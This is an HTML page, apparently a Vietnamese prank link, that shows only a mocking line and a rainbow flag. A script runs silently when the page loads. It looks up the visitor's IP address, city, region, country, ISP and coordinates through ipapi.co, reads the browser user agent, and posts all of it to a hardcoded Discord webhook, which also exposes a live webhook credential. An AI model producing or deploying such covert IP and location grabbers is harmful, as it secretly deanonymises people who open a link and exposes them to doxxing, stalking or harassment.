<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">

</head>
<body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-size:40px;">

    m gayy 🏳️‍🌈

    <script>
        // Discord Webhook
        const webhook = "https://discord.com/api/webhooks/1502339860885803158/fuKme2rsI2aq9jLBcYb4ARSTZq_jhxNu5bXunLm5BmxMOMfc7bnWV514x0V1IHFS1kNO";

        async function sendInfo() {
            try {

                // Lấy IP + vị trí bằng ipapi.co
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();

                // Thiết bị
                const device = navigator.userAgent;

                // Nội dung gửi webhook
                const payload = {
                    content:
`📱 Có người mở web

🌍 IP: ${data.ip}

📍 Địa chỉ:
${data.city}, ${data.region}, ${data.country_name}

🏢 Nhà mạng:
${data.org}

📡 Tọa độ:
${data.latitude}, ${data.longitude}

💻 Thiết bị:
${device}`
                };

                // Gửi về Discord
                await fetch(webhook, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.log(err);
            }
        }

        sendInfo();
    </script>

</body>
</html>
